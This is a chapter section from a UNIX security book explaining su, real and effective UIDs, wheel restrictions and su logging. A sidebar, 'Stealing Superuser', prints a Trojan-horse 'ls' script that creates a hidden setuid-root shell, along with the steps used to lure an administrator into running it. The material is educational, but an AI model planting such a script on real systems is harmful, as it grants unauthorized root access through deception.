<html><head>
<title>[Chapter 4] 4.3 su: Changing Who You Claim to Be</TITLE>
<meta name="DC.title" content="Practical UNIX &amp; Internet Security"><meta name="DC.creator" content="Simson Garfinkel &amp; Gene Spafford"><meta name="DC.publisher" content="O'Reilly &amp; Associates, Inc."><meta name="DC.date" content="1999-02-04T00:01:16Z"><meta name="DC.type" content="Text.Monograph"><meta name="DC.format" content="text/html" scheme="MIME"><meta name="DC.source" content="1-56592-148-8" scheme="ISBN"><meta name="DC.language" content="en-US"><meta name="generator" content="Jade 1.1/O'Reilly DocBook 3.0 to HTML 4.0"><link rev="made" href="mailto:online-books@oreilly.com" title="Online Books Comments"><link rel="up" href="ch04_01.htm" title="4. Users, Groups, and the Superuser"><link rel="prev" href="ch04_02.htm#PUIS-CHP-4-SECT-2.3" title="4.2 Special Usernames"><link rel="next" href="ch04_04.htm" title="4.4 Summary"></HEAD
><body bgcolor="#FFFFFF" text="#000000"><div class="htmlnav"><h1><img src="gifs/smbanner.gif" alt="Practical UNIX &amp; Internet Security" usemap="#srchmap" border="0"></H1
><map name="index.htmlsrchmap"><area shape="RECT" coords="0,0,466,65" href="index.htm" alt="Practical UNIX &amp; Internet Security"><area shape="RECT" coords="467,0,514,18" href="../search/psrch.htm" alt="Search this book"></MAP
><table width="515" border="0" cellspacing="0" cellpadding="0"><tr><td align="LEFT" valign="TOP" width="172"><a class="SECT1" href="ch04_02.htm#PUIS-CHP-4-SECT-2.3" title="4.2 Special Usernames"><img src="../gifs/txtpreva.gif" alt="Previous: 4.2 Special Usernames" border="0"></A
></TD
><td align="CENTER" valign="TOP" width="171"><b><font face="ARIEL,HELVETICA,HELV,SANSERIF" size="-1">Chapter 4<br>Users, Groups, and the Superuser</FONT
></B
></TD
><td align="RIGHT" valign="TOP" width="172"><a class="SECT1" href="ch04_04.htm" title="4.4 Summary"><img src="../gifs/txtnexta.gif" alt="Next: 4.4 Summary" border="0"></A
></TD
></TR
></TABLE
>&nbsp;<hr align="LEFT" width="515" title="footer"></DIV
><div class="SECT1"><h2 class="sect1"><a class="title" name="PUIS-CHP-4-SECT-3">4.3 su: Changing Who You Claim to Be</A
></H2
><p class="para"><a class="indexterm" name="AUTOID-3346"></A
><a class="indexterm" name="AUTOID-3348"></A
><a class="indexterm" name="AUTOID-3351"></A
>Sometimes, one user must assume the identity
of another. For example, you might sit down at a friend's
terminal and want to access one of your protected files. Rather
than forcing you to log your friend out and log yourself in, <span class="acronym">UNIX</SPAN
>
gives you a way to change your user <span class="acronym">ID</SPAN
> temporarily.
It is called the <kbd class="command">su</KBD
> command, short for &quot;substitute user.&quot;
<kbd class="command">su</KBD
> requires that you provide the password of the user to whom you
are changing.</P
><p class="para">For example, to change yourself from
<i class="systemitem.username">tim</I
> to <i class="systemitem.username">john</I
>, you might type:</P
><blockquote class="screen"><pre class="screen">% <b class="emphasis.bold">whoami </B
>
tim  
% <b class="emphasis.bold">su john</B
> 
password: <i class="systemitem.password">fuzbaby</I
> 
% <b class="emphasis.bold">whoami </B
>
john  
% </PRE
></BLOCKQUOTE
><p class="para">You can now access <i class="systemitem.username">john</I
>'s
files. (And you will be unable to access <i class="systemitem.username">tim</I
>'s
files, unless those files are specifically available to the user
<i class="systemitem.username">john</I
>.)</P
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.1">4.3.1 Real and Effective UIDs</A
></H3
><p class="para"><a class="indexterm" name="AUTOID-3373"></A
><a class="indexterm" name="AUTOID-3376"></A
><a class="indexterm" name="AUTOID-3379"></A
><a class="indexterm" name="AUTOID-3381"></A
>Processes
on <span class="acronym">UNIX</SPAN
> systems have at least two identities
at every moment. Normally, these two identities are the same. The
first identity is the <i class="firstterm">real </I
>UID. The real
<span class="acronym">UID</SPAN
> is your &quot;real identity&quot;
and matches up (usually) with the username you logged in as. Sometimes,
you may want to take on the identity of another user to access some
files or execute some commands. You might do this by logging in
as that user, thus obtaining a new command interpreter whose underlying
process has a real <span class="acronym">UID</SPAN
> equal to that user.</P
><p class="para">Alternatively, if you only want to execute a few commands
as another user, you can use the <kbd class="command">su</KBD
> command, as described above,
to create a new process. This will run a new copy of your command
interpreter (shell), and have the identity (real <span class="acronym">UID</SPAN
>)
of that other user. To use the <kbd class="command">su</KBD
> command, you must either know
the password for the other user's account, or you must
currently be running as the superuser.</P
><p class="para">There are times
when a software author wants a single command to execute with the
rights and privileges of another user&nbsp;- most often, the <i class="systemitem.username">root</I
> user. In a case such as
this, we certainly don't want to disclose the password
to the <i class="systemitem.username">root</I
> account, nor do we want the user to have access to a
command interpreter running as <i class="systemitem.username">root</I
>.
<span class="acronym">UNIX</SPAN
> addresses this problem through the use of
a special kind of file designation called <a class="indexterm" name="AUTOID-3396"></A
><a class="indexterm" name="AUTOID-3398"></A
>
setuid or <span class="acronym">SUID</SPAN
>. When a <span class="acronym">SUID</SPAN
>
file is run, the process involved takes on an <em class="emphasis">effective
UID </EM
>that is the same as the owner of the file, but the
<em class="emphasis">real</EM
> <span class="acronym">UID</SPAN
> remains the same.
<span class="acronym">SUID</SPAN
> files are explained in the following chapter.</P
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.2">4.3.2 Saved IDs</A
></H3
><p class="para">Some versions of <span class="acronym">UNIX</SPAN
>
have a third form of <span class="acronym">UID</SPAN
>: the <i class="firstterm"><a class="indexterm" name="AUTOID-3412"></A
>saved UID</I
>. In these systems, a user may
run a setuid program that sets an effective <span class="acronym">UID</SPAN
>
of 0 and then sets some different real <span class="acronym">UID</SPAN
> as
well. The saved <span class="acronym">UID</SPAN
> is used by the system to
allow the user to set identity back to the original value. Normally,
this is not something the user can see, but it can be important
when you are writing or running setuid programs.</P
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.3">4.3.3 Other IDs</A
></H3
><p class="para"><span class="acronym">UNIX</SPAN
> also
has the analogous concepts of <i class="firstterm"><a class="indexterm" name="AUTOID-3422"></A
>effective
GID</I
>, <i class="firstterm">real GID</I
>, and <i class="firstterm">setgid
for groups. </I
></P
><p class="para">Some versions of <span class="acronym">UNIX</SPAN
>
also have <i class="firstterm"><a class="indexterm" name="AUTOID-3429"></A
><a class="indexterm" name="AUTOID-3432"></A
><a class="indexterm" name="AUTOID-3435"></A
>session IDs,</I
> <i class="firstterm">process group
IDs</I
>, and <i class="firstterm">audit IDs</I
>. A session
ID is associated with the processes connected to a terminal, and
can be thought of as indicating a &quot;login session.&quot;
A process group ID designates a group of processes that are in the
<i class="firstterm">foreground</I
> or <i class="firstterm">background </I
>on
systems that allow job control. An audit ID indicates a thread of
activity to be indicated as the same in the audit mechanism. We
will not describe any of these further in this book because you
don't really need to know how they work. However, now you
know what they are if you encounter their names.</P
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.4">4.3.4 Becoming the Superuser</A
></H3
><p class="para"><a class="indexterm" name="AUTOID-3444"></A
><a class="indexterm" name="AUTOID-3447"></A
>Typing <kbd class="command">su</KBD
> without
a username tells <span class="acronym">UNIX</SPAN
> that you wish to become
the superuser. You will be prompted for a password. Typing the correct
<i class="systemitem.username">root</I
> password causes
a shell to be run with a <span class="acronym">UID</SPAN
> of 0. When you become
the superuser, your prompt should change to the pound sign (#)
to remind you of your new powers. For example:</P
><blockquote class="screen"><pre class="screen">% <b class="emphasis.bold">/bin/su - </B
>
password: <i class="systemitem.password">k697dgf</I
>
# <b class="emphasis.bold">whoami </B
>
root  
#</PRE
></BLOCKQUOTE
><p class="para">When using the <kbd class="command">su</KBD
> command to become the superuser, you should
always type the command's full pathname, <i class="filename">/bin/su</I
>.
By typing the full pathname, you are assuring that you are actually
running the real <i class="filename">/bin/su</I
> command, and not another
command named <i class="filename">su</I
> that happens to be in your
search path. This method is a very important way of protecting yourself
(and the superuser password) from capture by a Trojan horse. Other
techniques are described in <a class="xref" href="ch11_01.htm" title="Protecting Against Programmed Threats">Chapter 11</A
>. Also
see the sidebar in the section <a class="xref" href="#PUIS-CHP-4-SB-1" title="Stealing Superuser">the sidebar "Stealing Superuser"</A
>
later in this chapter.</P
><p class="para">Notice the use of the dash shown
in the earlier example. Most versions of the <kbd class="command">su</KBD
> command support
an optional argument of a single dash. When supplied, this causes
<kbd class="command">su</KBD
> to invoke its sub-shell with a dash, which causes the shell to
read all relevant startup files and simulate a login. Using the
dash option is important when becoming a superuser: the option assures
that you will be using the superuser's path, and not the
path of the account from which you <kbd class="command">su</KBD
>'ed.</P
><p class="para">To
exit the subshell, type exit or press control-D.</P
><p class="para">If
you use the <kbd class="command">su</KBD
> command to change to another user while you are the
su-peruser, you won't be prompted for the password of the
user who you are changing yourself into. (This makes sense; as you're
the superuser, you could as easily change that user's password
and then log in as that user.) For example:</P
><blockquote class="screen"><pre class="screen"># <b class="emphasis.bold">su john </B
>
% <b class="emphasis.bold">whoami </B
>
john  
% </PRE
></BLOCKQUOTE
><p class="para">Once you have become
the superuser, you are free to perform whatever system administration
you wish.</P
><p class="para">Using <kbd class="command">su</KBD
> to become the superuser is not a
security hole. Any user who knows the superuser password could also
log in as superuser; breaking in through <kbd class="command">su</KBD
> is no easier. In fact,
<kbd class="command">su</KBD
> enhances security: many <span class="acronym">UNIX</SPAN
> systems can be
set up so that every <kbd class="command">su</KBD
> attempt is logged, with the date, time,
and user who typed the command. Examining these log files allows
the system administrator to see who is exercising superuser privileges&nbsp;- as
well as who shouldn't be!</P
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.5">4.3.5 Using <kbd class="command">su</KBD
> with Caution</A
></H3
><p class="para">If you are the
system administrator, you should be careful about how you use the
<kbd class="command">su</KBD
> command. Remember, if you <kbd class="command">su</KBD
> to the superuser account, you can
do things by accident that you would normally be protected from
doing. You could also accidentally give away access to the superuser
account without knowing you did so.</P
><p class="para">As an example of
the first case, consider the real instance of someone we know who
thought that he was in a temporary directory in his own account
and typed rm -rf *. Unfortunately, he was actually in the
<i class="filename">/usr/lib </I
>directory, and he was operating as
the superuser. He spent the next few hours restoring tapes, checking
permissions, and trying to soothe irate users. The moral of this
small vignette, and hundreds more we could relate with similar consequences,
is that you should not be issuing commands as the superuser unless
you need the extra privileges. Program construction, testing, and
personal &quot;housecleaning&quot; should all be done under
your own user identity.</P
><p class="para">Another example is when you
accidentally execute a <a class="indexterm" name="AUTOID-3491"></A
><a class="indexterm" name="AUTOID-3493"></A
>
Trojan
Horse program instead of the system command you thought you executed.
(See the sidebar later in this chapter.) If something like this
happens to you as user <i class="systemitem.username">root</I
>, full access to your system can be given
away. We discuss some defenses to this in <a class="xref" href="ch11_01.htm" title="Protecting Against Programmed Threats">Chapter 11</A
>,
but one major suggestion is worth repeating: if you need access
to someone else's files, <kbd class="command">su</KBD
> to that user ID and make the
accesses as that user rather than as the superuser.</P
><p class="para">For
instance, if a user reports a problem with files in her account,
you could <kbd class="command">su</KBD
> to the <i class="systemitem.username">root</I
>
account and investigate, because you might not be able to access
her account or files from your own, regular account. However, a
better approach is to <kbd class="command">su</KBD
> to the superuser account, and then <kbd class="command">su</KBD
> to
the user's account&nbsp;- you won't need her
password for the <kbd class="command">su</KBD
> after you are <i class="systemitem.username">root</I
>.
Not only does this method protect the <i class="systemitem.username">root</I
> account, but you will
also have some of the same access permissions as the user you are
helping, and that would help you find the problem sooner.</P
><div class="sidebar"><h4 class="sidebar"><a class="title" name="PUIS-CHP-4-SB-1">Stealing Superuser</A
></H4
><p class="para">Once upon a time, many years ago, one of us needed access
to the <i class="systemitem.username">root</I
> account
on an academic machine. Although we had been authorized by management
to have <i class="systemitem.username">root </I
>access,
the local system manager didn't want to disclose the password.
He asserted that access to the <i class="systemitem.username">root</I
> account was dangerous (correct),
that he had far more knowledge of<span class="acronym"> UNIX </SPAN
>than we
did (unlikely), and that we didn't need the access (incorrect).
After several diplomatic and bureaucratic attempts to get access
normally, we took a slightly different approach, with management's
wry approval.</P
><p class="para">We noticed that this user had &quot;.&quot;
at the beginning of his shell search path. This meant that every
time he typed a command name, the shell would first search the current
directory for the command of the same name. When he did a <kbd class="command">su</KBD
> to
<i class="systemitem.username">root</I
>, this search path
was inherited by the new shell. This was all we really needed.</P
><p class="para">First, we created an executable shell file named ls in the
current directory:</P
><blockquote class="screen"><pre class="screen">#!/bin/sh
cp /bin/sh ./stuff/junk/.superdude
chmod 4555 ./stuff/junk/.superdude
rm -f $0
exec /bin/ls ${1+&quot;$@&quot;}</PRE
></BLOCKQUOTE
><p class="para">Then,
we executed the following commands:</P
><blockquote class="screen"><pre class="screen">% <b class="emphasis.bold">cd </B
>
% <b class="emphasis.bold">chmod 700 .</B
>
% <b class="emphasis.bold">touch ./-f</B
></PRE
></BLOCKQUOTE
><p class="para">The trap was ready. We
approached the recalcitrant administrator with the complaint, &quot;I
have a funny file in my directory I can't seem to delete.&quot;
Because the directory was mode 700, he couldn't list the
directory to see the contents. So, he used <kbd class="command">su</KBD
> to become user <i class="systemitem.username">root</I
>. Then he changed the directory
to our home directory and issued the command ls to view the problem
file. Instead of the system version of ls, he ran our version. This
created a hidden setuid <i class="systemitem.username">root</I
>
copy of the shell, deleted the bogus ls command, and ran the real
ls command. The administrator never knew what happened.</P
><p class="para">We
listened politely as he explained (superciliously) that files beginning
with a dash character (-) needed to be deleted with a pathname
relative to the current directory (in our case, <i class="filename">rm ./-f</I
>);
of course, we knew that.</P
><p class="para">A few minutes later, he couldn't
get the new <i class="systemitem.username">root</I
> password.</P
></DIV
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.6">4.3.6 Restricting <kbd class="command">su</KBD
></A
></H3
><p class="para"><a class="indexterm" name="AUTOID-3536"></A
><a class="indexterm" name="AUTOID-3538"></A
>On some versions of Berkeley-derived
<span class="acronym">UNIX</SPAN
>, a user cannot <kbd class="command">su</KBD
> to the <i class="systemitem.username">root</I
> account unless the user
is a member of the process group <i class="systemitem.username"><a class="indexterm" name="AUTOID-3545"></A
>wheel</I
>&nbsp;- or any other group
given the group ID of 0. For this restriction to work, the <i class="filename">/etc/group</I
>
entry for group <i class="systemitem.username">wheel</I
>
must be non-empty; if the entry has no usernames listed, the restriction
is disabled, and anyone can <kbd class="command">su</KBD
> to user <i class="systemitem.username">root</I
>
if they have the password.</P
><p class="para">Some versions of <kbd class="command">su</KBD
> also
allow members of the <i class="systemitem.username">wheel</I
>
group to become the superuser by providing their own passwords instead
of the superuser password. The advantage of this feature is that
you don't need to tell the superuser's password
to a user for them to have superuser access&nbsp;- you simply
have to put them into the <i class="systemitem.username">wheel</I
>
group. You can take away their access simply by taking them out
of the group.</P
><p class="para">Some versions of <a class="indexterm" name="AUTOID-3556"></A
>
System V <span class="acronym">UNIX</SPAN
>
require that users specifically be given permission to <kbd class="command">su</KBD
>. Different
versions of <span class="acronym">UNIX</SPAN
> accomplish this in different
ways; consult your own system's documentation for details,
and use the mechanism if it is available.</P
><p class="para">Another way
to restrict the <kbd class="command">su</KBD
> program is by making it executable only by a
specific group and by placing in that group only the people who
you want to be able to run the command. For information on how to
do this, see &quot;Changing a File's Permissions&quot;
in <a class="xref" href="ch05_01.htm" title="The UNIX Filesystem">Chapter 5</A
>.</P
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.7">4.3.7 The Bad <kbd class="command">su</KBD
> Log</A
></H3
><p class="para"><a class="indexterm" name="AUTOID-3569"></A
><a class="indexterm" name="AUTOID-3572"></A
><a class="indexterm" name="AUTOID-3575"></A
><a class="indexterm" name="AUTOID-3578"></A
><a class="indexterm" name="AUTOID-3581"></A
>Most
versions of the <kbd class="command">su</KBD
> command log failed attempts. Older versions of
<span class="acronym">UNIX</SPAN
> explicitly logged bad <kbd class="command">su</KBD
> attempts to the
console and in the <i class="filename">/var/adm/messages</I
> file.[11] Newer versions log
bad <kbd class="command">su</KBD
> attempts through the <a class="indexterm" name="AUTOID-3591"></A
>
syslog
facility, allowing you to send the messages to a file of your choice
or to log facilities on remote computers across the network. (Some
System V versions log to the file <i class="filename"><a class="indexterm" name="AUTOID-3594"></A
><a class="indexterm" name="AUTOID-3597"></A
>/var/adm/sulog</I
>
in addition to syslog, or instead of it.)</P
><blockquote class="footnote"><p class="para">[11] Many UNIX log files that are currently stored in the /var/adm
directory have been stored in the /usr/adm directory
in previous versions of UNIX.</P
></BLOCKQUOTE
><p class="para">If you notice
many bad attempts, it may well be an indication that somebody using
an account on your system is trying to gain unauthorized privileges:
this might be a legitimate user poking around, or it might be an
indication that the user's account has been appropriated
by an outsider who is trying to gain further access.</P
><p class="para">A
single bad attempt, of course, might simply be a mistyped password,
someone mistyping the du command, or somebody wondering what the
<kbd class="command">su</KBD
> command does.[12]</P
><blockquote class="footnote"><p class="para">[12] Which of course leads us to observe
that people who try commands to see what they do shouldn't
be allowed to run commands like <kbd class="command">su</KBD
> once they find out.</P
></BLOCKQUOTE
><p class="para">You can quickly scan the <i class="filename">/var/adm/messages</I
>
file for bad passwords with the grep command:</P
><blockquote class="screen"><pre class="screen">% <b class="emphasis.bold">grep BAD /var/adm/messages</B
>
BADSU 09/12 18:40 - pts/0 rachel-root</PRE
></BLOCKQUOTE
><p class="para">Good <kbd class="command">su</KBD
> attempts look like this:</P
><blockquote class="screen"><pre class="screen">% <b class="emphasis.bold">grep + /var/adm/sulog</B
>
SU 09/14 23:42 + pts/2 simsong-root
SU 09/16 08:40 + pts/4 simsong-root
SU 09/16 10:34 + pts/3 simsong-root</PRE
></BLOCKQUOTE
><p class="para">It would appear that Simson has been busy <kbd class="command">su</KBD
>'ing
to <i class="systemitem.username">root</I
> on September 14th and 16th.</P
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-4-SECT-3.7.1">4.3.7.1 The sulog under Berkeley UNIX</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-3619"></A
>The <i class="filename">/var/adm/messages</I
>
log has a different format on computers running Berkeley <span class="acronym">UNIX</SPAN
>:</P
><blockquote class="screen"><pre class="screen">% grep su:
Sep 11 01:40:59 bogus.com su: ericx to root on /dev/ttyu0
Sep 12 18:40:02 bogus.com su: BAD su rachel on /dev/ttyp1</PRE
></BLOCKQUOTE
><p class="para">In this example, user <i class="systemitem.username">rachel</I
>
tried to <kbd class="command">su</KBD
> on September 12th and failed. This is something we would
investigate further to see if it really was Rachel.</P
></DIV
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-4-SECT-3.8">4.3.8 Other Uses of <kbd class="command">su</KBD
></A
></H3
><p class="para">On older versions of
<span class="acronym">UNIX</SPAN
>, the <kbd class="command">su</KBD
> command was frequently used in the
<i class="filename">crontab</I
> file to cause programs executed by
cron to be run under different user IDs. A line from a <i class="filename">crontab</I
>
file to run the UUCP uuclean program (which trims the log files
in the uucp directory) might have had the form:</P
><blockquote class="screen"><pre class="screen">0 4 * * * su uucp -c /usr/lib/uucp/uuclean</PRE
></BLOCKQUOTE
><p class="para">This use of <kbd class="command">su</KBD
> is now largely obsolete: the few systems that
still use a single <i class="filename">crontab</I
> file for all users
now allow the username to be specified as the sixth argument on
each line of the <i class="filename">crontab</I
> file:</P
><blockquote class="screen"><pre class="screen">0 4 * * * uucp /usr/lib/uucp/uuclean</PRE
></BLOCKQUOTE
><p class="para">Most versions of <span class="acronym">UNIX</SPAN
> now use a version
of the cron system that can have a separate <i class="filename">crontab</I
>
file for each user, and there is no need to specify the username
to use. Each file is given the username of the user for whom it
is to be run; that is, cron commands to be run as <i class="systemitem.username">root</I
> are placed in a file called
<i class="systemitem.username">root</I
>, while cron commands
to be run as <i class="systemitem.username">uucp</I
> are
placed in a file called <i class="systemitem.username">uucp</I
>.
These files are often kept in the directory <i class="filename">/usr/spool/cron/crontabs</I
>.</P
><p class="para">Nevertheless, you can still use the <kbd class="command">su</KBD
> command for
running commands under different user names. You might want to do
this in some shell scripts. However, check your documentation as
to the proper method of specifying options to be passed to the command
via the <kbd class="command">su</KBD
> command line.<a class="indexterm" name="AUTOID-3653"></A
><a class="indexterm" name="AUTOID-3655"></A
><a class="indexterm" name="AUTOID-3658"></A
></P
></DIV
></DIV
><div class="htmlnav"><p></P
><hr align="LEFT" width="515" title="footer"><table width="515" border="0" cellspacing="0" cellpadding="0"><tr><td align="LEFT" valign="TOP" width="172"><a class="SECT1" href="ch04_02.htm#PUIS-CHP-4-SECT-2.3" title="4.2 Special Usernames"><img src="../gifs/txtpreva.gif" alt="Previous: 4.2 Special Usernames" border="0"></A
></TD
><td align="CENTER" valign="TOP" width="171"><a class="book" href="index.htm" title="Practical UNIX &amp; Internet Security"><img src="../gifs/txthome.gif" alt="Practical UNIX &amp; Internet Security" border="0"></A
></TD
><td align="RIGHT" valign="TOP" width="172"><a class="SECT1" href="ch04_04.htm" title="4.4 Summary"><img src="../gifs/txtnexta.gif" alt="Next: 4.4 Summary" border="0"></A
></TD
></TR
><tr><td align="LEFT" valign="TOP" width="172">4.2 Special Usernames</TD
><td align="CENTER" valign="TOP" width="171"><a class="index" href="index/idx_0.htm" title="Book Index"><img src="../gifs/index.gif" alt="Book Index" border="0"></A
></TD
><td align="RIGHT" valign="TOP" width="172">4.4 Summary</TD
></TR
></TABLE
><hr align="LEFT" width="515" title="footer"><p class="nav"><font size="-1">[ <a href="../index.htm" title="The Networking CD Bookshelf">Library Home</A
> | <a href="../dnsbind/index.htm" title="DNS &amp; BIND">DNS &amp; BIND</A
> | <a href="../tcpip/index.htm" title="TCP/IP Network Administration">TCP/IP</A
> | <a href="../sendmail/index.htm" title="sendmail">sendmail</A
> | <a href="../smdref/index.htm" title="sendmail Desktop Reference">sendmail Reference</A
> | <a href="../firewall/index.htm" title="Building Internet Firewalls">Firewalls</A
> | <a href="index.htm" title="Practical UNIX &amp; Internet Security">Practical Security</A
> ]</FONT
></P
></DIV
></BODY
></HTML
>
